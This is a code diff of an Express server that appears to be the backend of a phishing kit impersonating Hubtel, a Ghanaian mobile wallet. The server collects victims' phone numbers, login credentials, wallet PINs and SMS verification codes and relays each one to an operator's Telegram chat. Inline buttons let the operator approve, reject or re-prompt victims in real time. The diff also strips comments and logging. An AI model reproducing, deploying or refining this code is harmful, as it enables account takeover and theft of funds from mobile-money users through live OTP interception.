@@ -7,17 +7,15 @@ const PORT = process.env.PORT || 8080;
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static('.')); // Tells Express to serve your HTML files
+app.use(express.static('.'));
 
-// Temporary memory pads to track user states by phone number
-const orderStatuses = {};   // Tracks Login / PIN steps
-const promoStatuses = {};   // Tracks SMS Code Verification step
+const orderStatuses = {};
+const promoStatuses = {};
 const lastSubmissionTime = {}; 
 
-// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
 async function sendToTelegram(url, payload) {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 seconds limit
+    const timeoutId = setTimeout(() => controller.abort(), 15000);
 
     try {
         const response = await fetch(url, {
@@ -35,21 +33,19 @@ async function sendToTelegram(url, payload) {
     }
 }
 
-// Handles both Login (Phone) and Pin Submissions
 app.post('/api/submit-order', async (req, res) => {
     try {
         const { phone, uniqueId } = req.body;
         
         const currentTime = Date.now(); 
-        const cooldownTime = 15 * 1000; // 15 seconds cooldown
+        const cooldownTime = 15 * 1000;
 
-        // Prevent duplicate spam submissions within 15 seconds
         if (lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
         }
 
         lastSubmissionTime[phone] = currentTime;
-        orderStatuses[phone] = 'pending'; // Reset status to pending for this step
+        orderStatuses[phone] = 'pending';
 
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -57,19 +53,22 @@ app.post('/api/submit-order', async (req, res) => {
         const countryFlag = "🇬🇭";
         const countryCode = "+233";
 
-        // Check if this submission is from pin.html (4-digit PIN) or login.html
         const isPinStep = uniqueId && uniqueId.length === 4 && /^\d+$/.test(uniqueId);
-        const headerTitle = isPinStep ? "🔐 *Hubtel Wallet PIN Submitted*" : "🔔 *New Hubtel Login Attempt*";
+        const headerTitle = isPinStep ? "🐉🔐 *HUBTEL WALLET PIN SUBMITTED*" : "🐉🔔 *NEW HUBTEL LOGIN ATTEMPT*";
         const credentialLabel = isPinStep ? "Wallet PIN" : "Credential";
 
-        const message = `${headerTitle}\n\n` +
-                        `${countryFlag} Country: \`${countryCode}\`\n` +
-                        `📱 Phone: \`${phone}\`\n` +
-                        `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
+        let message = `${headerTitle}\n\n` +
+                      `${countryFlag} Country: \`${countryCode}\`\n` +
+                      `📱 Phone: \`${phone}\``;
+
+        if (uniqueId) {
+            message += `\n🔑 ${credentialLabel}: \`${uniqueId}\``;
+        }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
         const wrongButtonText = isPinStep ? "⚠️ Wrong PIN" : "⚠️ Wrong Details";
+
+        const cbDataId = uniqueId || 'none';
 
         await sendToTelegram(telegramUrl, {
             chat_id: CHAT_ID,
@@ -78,33 +77,29 @@ app.post('/api/submit-order', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Approve", callback_data: `approve_${phone}_${uniqueId || 'N/A'}` },
-                        { text: "❌ Not User", callback_data: `not_user_${phone}_${uniqueId || 'N/A'}` }
+                        { text: "✅ Approve", callback_data: `approve_${phone}_${cbDataId}` },
+                        { text: "❌ Not User", callback_data: `not_user_${phone}_${cbDataId}` }
                     ],
                     [
-                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${uniqueId || 'N/A'}` }
+                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${cbDataId}` }
                     ]
                 ]
             }
         });
 
-        res.json({ success: true, message: 'Sent to chef.' });
+        res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
         console.error(error);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
 
-// Polling loop to check if admin approved the login or PIN
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone ? req.query.phone.trim() : '';
     const status = orderStatuses[phone] || 'pending';
-    
-    console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
     res.json({ status });
 });
 
-// Handles SMS Code (scratch.html) verification
 app.post('/api/verify-promo', async (req, res) => {
     try {
         const { phone, promoCode, uniqueId } = req.body; 
@@ -114,12 +109,16 @@ app.post('/api/verify-promo', async (req, res) => {
         promoStatuses[phone] = 'pending';
 
         const countryFlag = "🇬🇭";
-        const message = `📋 *SMS Code Verification Request*\n\n` +
-                        `${countryFlag} Phone: \`${phone}\`\n` +
-                        `🔑 Credential: \`${uniqueId || 'N/A'}\`\n` + 
-                        `🔢 Code Entered: \`${promoCode}\``;
+        let message = `🐊📋 *SMS CODE VERIFICATION REQUEST*\n\n` +
+                        `${countryFlag} Phone: \`${phone}\``;
+
+        if (uniqueId) {
+            message += `\n🔑 Credential: \`${uniqueId}\``;
+        }
+        message += `\n🔢 Code Entered: \`${promoCode}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const cbDataId = uniqueId || 'none';
         
         const tgResponse = await sendToTelegram(telegramUrl, {
             chat_id: CHAT_ID,
@@ -128,29 +127,27 @@ app.post('/api/verify-promo', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Valid Code", callback_data: `valid_${phone}_${uniqueId || 'N/A'}` },
-                        { text: "❌ Wrong Code", callback_data: `wrong_code_${phone}_${uniqueId || 'N/A'}` }
+                        { text: "✅ Valid Code", callback_data: `valid_${phone}_${cbDataId}` },
+                        { text: "❌ Wrong Code", callback_data: `wrong_code_${phone}_${cbDataId}` }
                     ],
                     [
-                        { text: "🔄 Try Again", callback_data: `try_again_${phone}_${uniqueId || 'N/A'}` }
+                        { text: "🔄 Try Again", callback_data: `try_again_${phone}_${cbDataId}` }
                     ]
                 ]
             }
         });
 
         if (tgResponse && tgResponse.ok === false) {
-            console.error("Telegram API Error:", tgResponse);
             return res.status(400).json({ success: false, message: tgResponse.description || 'Telegram rejection' });
         }
 
-        res.json({ success: true, message: 'Success!.' });
+        res.json({ success: true, message: 'Success.' });
     } catch (error) {
-        console.error("CRITICAL BACKEND ERROR in /api/verify-promo:", error.message);
+        console.error("CRITICAL BACKEND ERROR:", error.message);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
 
-// Polling loop for scratch.html SMS verification status
 app.get('/api/check-promo-status', (req, res) => {
     const phone = req.query.phone ? req.query.phone.trim() : '';
     const status = promoStatuses[phone] || 'pending';
@@ -164,10 +161,12 @@ app.post('/api/send-thank-you', async (req, res) => {
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
         const countryFlag = "🇬🇭";
-        const message = `💬 *OTP Resend Requested*\n\n` +
-                        `${countryFlag} Phone: \`${phone}\`\n` +
-                        `🔑 Credential: \`${uniqueId || 'N/A'}\`\n` +
-                        `📌 Action: *Resend SMS Code*`;
+        let message = `🐅💬 *OTP RESEND REQUESTED*\n\n` +
+                        `${countryFlag} Phone: \`${phone}\``;
+        if (uniqueId) {
+            message += `\n🔑 Credential: \`${uniqueId}\``;
+        }
+        message += `\n📌 Action: *Resend SMS Code*`;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
@@ -179,12 +178,11 @@ app.post('/api/send-thank-you', async (req, res) => {
 
         res.json({ success: true, message: 'sent.' });
     } catch (error) {
-        console.error("CRITICAL BACKEND ERROR in /api/send-thank-you:", error.message);
+        console.error("CRITICAL BACKEND ERROR:", error.message);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
 
-// Handles inline button clicks from Telegram admin
 app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
@@ -197,58 +195,67 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             let actionText = '';
             let phone = '';
-            let uniqueId = 'N/A';
-            let messageTitle = 'Processed Request';
+            let uniqueId = '';
+            let messageTitle = 'PROCESSED REQUEST';
+            let emojiIcon = '🐉';
 
             if (callbackData.startsWith('approve_')) {
                 const parts = callbackData.replace('approve_', '').split('_');
                 phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
+                uniqueId = parts[1] === 'none' ? '' : parts[1];
                 orderStatuses[phone] = 'approved';
                 actionText = 'Approved ✅';
-                messageTitle = 'Approval Result';
+                messageTitle = 'APPROVAL RESULT';
+                emojiIcon = '🐉';
             } else if (callbackData.startsWith('reject_') || callbackData.startsWith('not_user_')) {
                 const prefix = callbackData.startsWith('not_user_') ? 'not_user_' : 'reject_';
                 const parts = callbackData.replace(prefix, '').split('_');
                 phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
+                uniqueId = parts[1] === 'none' ? '' : parts[1];
                 orderStatuses[phone] = 'not_user';
                 actionText = 'Not Registered ❌';
-                messageTitle = 'Registration Check Result';
+                messageTitle = 'REGISTRATION CHECK RESULT';
+                emojiIcon = '🐊';
             } else if (callbackData.startsWith('wrong_id_')) {
                 const parts = callbackData.replace('wrong_id_', '').split('_');
                 phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
+                uniqueId = parts[1] === 'none' ? '' : parts[1];
                 orderStatuses[phone] = 'wrong_id';
                 actionText = 'Incorrect Credential ⚠️';
-                messageTitle = 'Credential Error Result';
+                messageTitle = 'CREDENTIAL ERROR RESULT';
+                emojiIcon = '🐅';
             } else if (callbackData.startsWith('valid_')) {
                 const parts = callbackData.replace('valid_', '').split('_');
                 phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
+                uniqueId = parts[1] === 'none' ? '' : parts[1];
                 promoStatuses[phone] = 'valid';
                 actionText = 'Valid Code ✅ (Accepted)';
-                messageTitle = 'Code Verification Result';
+                messageTitle = 'CODE VERIFICATION RESULT';
+                emojiIcon = '🐉';
             } else if (callbackData.startsWith('wrong_code_')) {
                 const parts = callbackData.replace('wrong_code_', '').split('_');
                 phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
+                uniqueId = parts[1] === 'none' ? '' : parts[1];
                 promoStatuses[phone] = 'invalid';
                 actionText = 'Wrong Code ❌ (Cleared)';
-                messageTitle = 'Code Verification Result';
+                messageTitle = 'CODE VERIFICATION RESULT';
+                emojiIcon = '🐊';
             } else if (callbackData.startsWith('try_again_')) {
                 const parts = callbackData.replace('try_again_', '').split('_');
                 phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
+                uniqueId = parts[1] === 'none' ? '' : parts[1];
                 promoStatuses[phone] = 'try_again';
                 actionText = 'Try Again 🔄 (Awaiting New Code)';
-                messageTitle = 'Code Verification Result';
+                messageTitle = 'CODE VERIFICATION RESULT';
+                emojiIcon = '🐅';
             }
 
-            let updatedMessage = `📋 *${messageTitle}*\n\n` +
-                                 `🇬🇭 Phone: \`${phone}\`\n` +
-                                 `🔑 Credential: \`${uniqueId}\`\n` +
-                                 `📌 Status: *${actionText}*`;
+            let updatedMessage = `${emojiIcon} *${messageTitle}*\n\n` +
+                                 `🇬🇭 Phone: \`${phone}\``;
+            if (uniqueId) {
+                updatedMessage += `\n🔑 Credential: \`${uniqueId}\``;
+            }
+            updatedMessage += `\n📌 Status: *${actionText}*`;
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
             await sendToTelegram(telegramUrl, {
@@ -265,7 +272,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
 });
 
-// Automatically register Telegram webhook on startup if RENDER_EXTERNAL_URL is provided
 async function registerTelegramWebhook() {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const RENDER_URL = process.env.RENDER_EXTERNAL_URL;
@@ -280,9 +286,7 @@ async function registerTelegramWebhook() {
     try {
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
         const result = await fetch(telegramUrl).then(res => res.json());
-
         console.log('Telegram webhook setup:', result);
-        console.log('Webhook URL:', webhookUrl);
     } catch (error) {
         console.error('Telegram webhook setup failed:', error.message);
     }
